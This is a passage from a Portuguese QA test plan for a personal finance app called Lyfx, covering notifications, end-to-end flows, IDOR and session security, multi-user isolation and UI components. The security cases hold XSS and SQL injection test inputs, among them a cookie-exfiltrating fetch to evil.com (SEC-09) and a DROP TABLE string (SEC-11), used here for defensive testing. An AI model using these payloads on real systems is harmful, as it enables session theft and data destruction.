**Resultado esperado:** `getNotifications` não retorna essa notificação (filtro `OR: [{ expiresAt: null }, { expiresAt: { gt: now } }]`). Badge não a conta.

---

### 20.3 Segurança e Isolamento

### NOT-18 — IDOR: excluir notificação de outro usuário
**Prioridade:** CRÍTICO
**Passos:** Logar como Usuário B; chamar `deleteNotification(idDeNotificacaoDeA)`
**Resultado esperado:** `WHERE { id, userId, fingerprint: null }` — userId do Usuário B não bate com a notificação de A. Operação sem efeito. Notificação de A preservada.

---

### NOT-19 — markAsRead sem sessão
**Prioridade:** CRÍTICO
**Resultado esperado:** `requireAuth()` lança `Error("Unauthenticated")`. Nenhuma notificação alterada.

---

### 20.4 Critérios de Aceite — Notificações

- [ ] Badge conta apenas notificações com `fingerprint: null` e `readAt: null`
- [ ] deleteNotification respeita filtro `fingerprint: null` (nunca apaga alertas automáticos)
- [ ] deleteAllNotifications respeita filtro `fingerprint: null`
- [ ] syncDangerAlerts é idempotente (fingerprint previne duplicatas)
- [ ] Notificações expiradas não aparecem no dropdown
- [ ] Notificação de boas-vindas enviada ao criar usuário via Studio
- [ ] Broadcast do Studio chega ao sino do usuário destinatário
- [ ] Broadcast para plano atinge apenas usuários do plano

---

## 21. Fluxos Transversais End-to-End

### FT-A — Transação e seus efeitos em cascata
**Prioridade:** CRÍTICO
**Passos:** Criar transação "Despesa variável" R$ 750; verificar `/dashboard`, `/budget`, `/alerts`, `/health`
**Resultado esperado:** Todos os módulos refletem a nova transação sem ação adicional. DRE atualiza, barra de orçamento vai para âmbar, alerta de aviso ativo, score de saúde afetado.

---

### FT-B — Parcelamento ponta a ponta
**Prioridade:** ALTO
**Passos:** Criar parcelamento `Geladeira` R$ 3.000 em 3x; verificar meses +0, +1, +2 em `/transactions` e `/projections`
**Resultado esperado:** Parcelas distribuídas corretamente em todas as visualizações.

---

### FT-C — Meta: criação → pagamento → conclusão → widget
**Prioridade:** ALTO
**Resultado esperado:** Meta "Concluída" após marcar todas as cobranças. Widget no dashboard reflete progresso em tempo real.

---

### FT-D — Passivo → Modo Recuperação → Banner em Metas
**Prioridade:** ALTO
**Resultado esperado:** Passivo de 7% a.m. → banner em Metas; Modo Recuperação ordena por taxa.

---

### FT-E — Score de saúde: modificação → impacto por dimensão
**Prioridade:** CRÍTICO
**Resultado esperado:** Passivo de alto valor → Comprometimento reduz. Transação debit_longterm → Poupança aumenta.

---

### FT-F — Despesa anual: criação → projeção → alerta sazonal
**Prioridade:** ALTO
**Resultado esperado:** IPTU anual aparece em `/fixed-expenses`, no gráfico de projeção como pico, na provisão sazonal e em `/alerts`.

---

### FT-G — Instituição → Passivo → Transação → Exclusão em cascade
**Prioridade:** ALTO
**Resultado esperado:** Excluir instituição preserva passivos e transações com FKs limpas (null).

---

### FT-H — Score muda → trilha educacional muda
**Prioridade:** ALTO
**Resultado esperado:** Mudar score de 60–79 para <40 atualiza trilha recomendada de "stable" para "critical" ou "serious".

---

### FT-I — Reembolso Especial → Transaction → Dashboard
**Prioridade:** CRÍTICO
**Passos:** Criar período KM; adicionar trajetos e notas; submeter; verificar Transaction em `/transactions` e KPI de receita no `/dashboard`
**Resultado esperado:** Transaction `credit_variable` com data D+5 aparece no DRE do mês correspondente. KPI Receita do Dashboard atualizado.

---

### FT-J — Reabrir período KM → Transaction deletada → Dashboard atualiza
**Prioridade:** CRÍTICO
**Passos:** Submeter período; verificar Transaction em `/transactions`; reabrir período; verificar novamente
**Resultado esperado:** Após reabrir, Transaction **não aparece mais** em `/transactions`. Dashboard exclui o valor do KPI de Receita.

---

### FT-K — Broadcast Studio → sino do usuário
**Prioridade:** ALTO
**Passos:** No Studio, enviar notificação para usuário X; logar como X; verificar sino
**Resultado esperado:** Badge aparece. Notificação visível no dropdown com título e corpo enviados.

---

### FT-L — Notificação de boas-vindas → novo usuário
**Prioridade:** ALTO
**Passos:** Criar usuário via Studio; logar com o novo usuário; verificar sino
**Resultado esperado:** Badge "1" no sino. Notificação "Bem-vindo ao Lyfx!" visível.

---

## 22. Segurança

### SEC-01 — IDOR: acesso a transação de outro usuário
**Prioridade:** CRÍTICO
**Resultado esperado:** Server Action retorna erro de autorização. Dados do Usuário A não retornados ou modificados.

---

### SEC-02 — IDOR: excluir meta de outro usuário
**Prioridade:** CRÍTICO
**Resultado esperado:** Operação negada. Meta do Usuário A não excluída.

---

### SEC-03 — IDOR: editar passivo de outro usuário
**Prioridade:** CRÍTICO
**Resultado esperado:** Operação negada. Passivo do Usuário A não alterado.

---

### SEC-04 — IDOR: acessar bens de outro usuário
**Prioridade:** CRÍTICO
**Resultado esperado:** Dados do Usuário A não retornados.

---

### SEC-05 — IDOR: acessar período KM de outro usuário
**Prioridade:** CRÍTICO
**Passos:** Logar como Usuário B; chamar `getKmPeriod(idDoUsarioA)`
**Resultado esperado:** Retorna `null`. Filtro `WHERE { id, userId }` isola o acesso.

---

### SEC-06 — IDOR: deletar lugar salvo KM de outro usuário
**Prioridade:** CRÍTICO
**Resultado esperado:** `db.kmPlace.deleteMany({ where: { id, userId } })` — não afeta registros de outro usuário.

---

### SEC-07 — XSS stored em descrição de transação
**Prioridade:** CRÍTICO
**Passos:** Descrição: `<script>alert('XSS')</script>`
**Resultado esperado:** Texto exibido literalmente em `/transactions`, `/dashboard` e DRE. Nenhum alerta executado.

---

### SEC-08 — XSS stored em nome de tag
**Prioridade:** CRÍTICO
**Passos:** Nome: `<img src=x onerror=alert(1)>`
**Resultado esperado:** Texto literal exibido. Nenhum código executado.

---

### SEC-09 — XSS stored em nome de período KM
**Prioridade:** ALTO
**Passos:** Nome do período: `<script>fetch('https://evil.com?c='+document.cookie)</script>`
**Resultado esperado:** Nome exibido como texto literal em todos os contextos. Nenhuma requisição externa realizada.

---

### SEC-10 — XSS stored em nota de passivo
**Prioridade:** ALTO
**Resultado esperado:** Notas exibidas como texto literal. Nenhuma requisição para domínio externo.

---

### SEC-11 — Input com SQL metacharacters
**Prioridade:** ALTO
**Passos:** Descrição: `'; DROP TABLE "Transaction"; --`
**Resultado esperado:** Texto salvo literalmente. Banco intacto. Prisma usa parameterized queries.

---

### SEC-12 — Payload de 10.000 caracteres
**Prioridade:** MÉDIO
**Resultado esperado:** Sistema bloqueia com validação OU aceita sem crash/timeout/corrupção.

---

### SEC-13 — Caracteres Unicode e emojis
**Prioridade:** MÉDIO
**Passos:** Descrição: `Café ☕ — João 中文 العربية 🎉`
**Resultado esperado:** Texto exibido exatamente como digitado.

---

### SEC-14 — Acessar rota protegida com cookie forjado
**Prioridade:** CRÍTICO
**Passos:** Criar manualmente cookie `lyfx_session = "cuid123.invalidsig"`; acessar `/dashboard`
**Resultado esperado:** HMAC inválido → `decode()` retorna null → `requireAuth()` redireciona para `/login`.

---

### SEC-15 — Chamar Server Action sem cookie de sessão
**Prioridade:** CRÍTICO
**Resultado esperado:** `requireAuth()` lança `Error("Unauthenticated")`. Dados não retornados.

---

### SEC-16 — Cookie `lyfx_admin` só válido em `/studio` (path-scoped)
**Prioridade:** CRÍTICO
**Passos:** Logar no Studio; verificar que cookie `lyfx_admin` tem `path: /studio`; tentar usar em rota fora de `/studio`
**Resultado esperado:** Cookie não enviado pelo browser para rotas fora de `/studio`. Acesso ao Studio sem o cookie correto resulta em formulário de senha.

---

### SEC-17 — Cookie `lyfx_session` com httpOnly
**Prioridade:** CRÍTICO
**Passos:** Via DevTools console, tentar acessar `document.cookie`
**Resultado esperado:** Cookie `lyfx_session` não visível via JavaScript. `httpOnly: true` impede acesso por JS.

---

### SEC-18 — Acessar rota com cookie de sessão de usuário deletado
**Prioridade:** ALTO
**Passos:** Logar como Usuário A; deletar Usuário A no Studio; tentar acessar `/dashboard` com cookie ainda ativo
**Resultado esperado:** Redirecionamento para limpar sessão e depois para `/login`. Sem loop infinito.

---

## 23. Isolamento Multi-Usuário

### ISO-01 — Transações isoladas entre usuários
**Prioridade:** CRÍTICO
**Resultado esperado:** Usuário B vê zero transações do Usuário A.

---

### ISO-02 — Tags isoladas entre usuários
**Prioridade:** ALTO
**Resultado esperado:** Lista de tags de B está vazia quando A tem tags.

---

### ISO-03 — Passivos isolados entre usuários
**Prioridade:** ALTO
**Resultado esperado:** Nenhum passivo do Usuário A visível para B.

---

### ISO-04 — Bens isolados entre usuários
**Prioridade:** ALTO
**Resultado esperado:** Nenhum bem do Usuário A visível para B.

---

### ISO-05 — Score de saúde não usa dados de outro usuário
**Prioridade:** CRÍTICO
**Resultado esperado:** Score do Usuário B calculado apenas com seus próprios dados (provavelmente 0 para novo usuário).

---

### ISO-06 — PillProgress isolado entre usuários
**Prioridade:** ALTO
**Resultado esperado:** Nenhuma pílula aparece como concluída para B. Streak = 0.

---

### ISO-07 — Reembolsos isolados entre usuários
**Prioridade:** MÉDIO
**Resultado esperado:** Lista vazia para B. Nenhum reembolso do Usuário A visível.

---

### ISO-08 — Períodos KM isolados entre usuários
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário A com 3 períodos KM submetidos
**Passos:** Logar como Usuário B; verificar `/km-reimbursement`
**Resultado esperado:** Zero períodos visíveis. `getKmPeriods` filtra `WHERE { userId }`.

---

### ISO-09 — Lugares salvos KM isolados entre usuários
**Prioridade:** ALTO
**Resultado esperado:** Usuário B não vê os lugares salvos do Usuário A.

---

### ISO-10 — Notificações isoladas entre usuários
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário A com 5 notificações
**Passos:** Logar como Usuário B; verificar sino
**Resultado esperado:** Badge = 0. Dropdown vazio (sem notificações do Usuário A).

---

### ISO-11 — KmConfig isolado por usuário
**Prioridade:** ALTO
**Resultado esperado:** Alteração de `gasolineRate` pelo Usuário A não afeta configuração do Usuário B.

---

## 24. Componentes Transversais

### CT-01 — MonthPicker: abrir, navegar e selecionar
**Prioridade:** MÉDIO
**Resultado esperado:** Dropdown abre. Navegação de anos funciona. Seleção fecha o dropdown. Mês atual destacado em cyan.

---

### CT-02 — MonthPicker: limpar seleção
**Prioridade:** BAIXO
**Resultado esperado:** Seleção limpa ao clicar em ×. MonthPicker volta ao estado sem seleção.

---

### CT-03 — CountrySelect: filtrar e selecionar
**Prioridade:** MÉDIO
**Passos:** Digitar `bra` no campo; verificar "Brasil" no topo; selecionar
**Resultado esperado:** Brasil selecionado. Países lusófonos aparecem no topo antes de filtrar.

---

### CT-04 — CountrySelect: limpar seleção
**Prioridade:** BAIXO
**Resultado esperado:** Campo volta ao estado vazio ao clicar em ×.

---

### CT-05 — UserMenu fecha ao clicar fora
**Prioridade:** MÉDIO
**Resultado esperado:** Dropdown fecha. Nenhuma navegação ocorre.

---

### CT-06 — Banner de manutenção global
**Prioridade:** ALTO
**Pré-condições:** Modo manutenção ativado no Studio
**Resultado esperado:** Banner amarelo aparece no topo de `/dashboard`, `/transactions`, `/goals` e demais rotas do app. Não aparece em `/studio`.

---

### CT-07 — ActionBar fecha ao clicar em outra transação
**Prioridade:** BAIXO
**Pré-condições:** ActionBar aberta para Transação A
**Passos:** Clicar em Transação B
**Resultado esperado:** ActionBar fecha e reabre para a Transação B. Não fica duas ActionBars abertas.

---

### CT-08 — Modais fecham ao clicar fora (overlay)
**Prioridade:** BAIXO
**Resultado esperado:** Clicar no overlay escuro fora do modal o fecha sem salvar o formulário.

---

---

## 25. Resumo de Cobertura

| # | Módulo | Casos | Críticos | Altos | Médios | Baixos |
|---|---|---|---|---|---|---|
| 1 | Autenticação | 21 | 7 | 9 | 4 | 1 |
| 2 | Navegação | 8 | 0 | 3 | 3 | 2 |
| 3 | Transações | 25 | 5 | 9 | 8 | 3 |
| 4 | Orçamento | 11 | 1 | 4 | 6 | 0 |
| 5 | Contas Fixas | 6 | 0 | 1 | 5 | 0 |
| 6 | Metas | 15 | 0 | 7 | 8 | 0 |
| 7 | Projeções | 4 | 0 | 2 | 2 | 0 |
| 8 | Passivos | 10 | 1 | 4 | 5 | 0 |
| 9 | Alertas Financeiros | 12 | 2 | 5 | 5 | 0 |
| 10 | Saúde Financeira | 12 | 0 | 6 | 5 | 1 |
| 11 | Relatórios | 6 | 0 | 2 | 4 | 0 |
| 12 | Reembolsos | 4 | 0 | 1 | 3 | 0 |
| 13 | Tags | 4 | 0 | 2 | 2 | 0 |
| 14 | Instituições | 3 | 0 | 1 | 2 | 0 |
| 15 | Bens e Imóveis | 4 | 0 | 1 | 3 | 0 |
| 16 | Educação | 16 | 4 | 7 | 4 | 1 |
| 17 | Perfil | 5 | 0 | 2 | 3 | 0 |
| 18 | Studio G2 | 41 | 4 | 18 | 14 | 5 |
| 19 | Reembolso Especial (CS-17) | 32 | 8 | 14 | 9 | 1 |
| 20 | Central de Notificações (CS-18/CS-19) | 19 | 5 | 9 | 5 | 0 |
| 21 | Fluxos Transversais E2E | 12 | 4 | 7 | 1 | 0 |
| 22 | Segurança | 18 | 11 | 5 | 2 | 0 |
| 23 | Isolamento Multi-Usuário | 11 | 4 | 6 | 1 | 0 |
| 24 | Componentes Transversais | 8 | 0 | 2 | 3 | 3 |
| **TOTAL** | | **317** | **56** | **136** | **107** | **17** |

### Cobertura por Área

| Área | Cobertura |
|---|---|
| Autenticação (cookie HMAC, sessão, redirect) | 100% |
| CRUD de Transações (avulsa, recorrente, parcelamento) | 100% |
| Orçamento (alocações, progress bars, balanço) | 100% |
| Metas (cobranças, viabilidade, progresso) | 100% |
| Passivos (Modo Recuperação, método avalanche) | 100% |
| Alertas Financeiros (7 tipos, calculados on-the-fly) | 100% |
| Saúde Financeira (4 dimensões, score, gauge) | 100% |
| Educação (quiz, streak, progress, timer) | 100% |
| Studio G2 (Painel, Usuários, Planos, Módulos, Notas, Notificações, Dados, Schema, Docs) | 100% |
| Reembolso Especial CS-17 (fluxo completo, fórmulas, D+5, PDF, lugares) | 100% |
| Central de Notificações CS-18/CS-19 (bell, badge, dedup, broadcast, syncDanger) | 100% |
| Segurança (IDOR, XSS, SQLi, cookie forgery, timing attacks) | 100% |
| Isolamento Multi-Usuário (todas as entidades com userId) | 100% |

---

*Documento gerado em 07/06/2026 · Versão da plataforma: 1.10.0*
*Baseado em análise do Agent Smith v9.0 · Myers · WAHH · Hendrickson · Kaner · Meszaros*
*Para referência técnica: DOCUMENTATION.md · Para features detalhadas: FEATURES.md*
*Delta v1.5.0 → v1.10.0: +95 casos novos (CS-17 Reembolso Especial +32, CS-18/CS-19 Notificações +19, Studio G2 +30, casos transversais +14)*
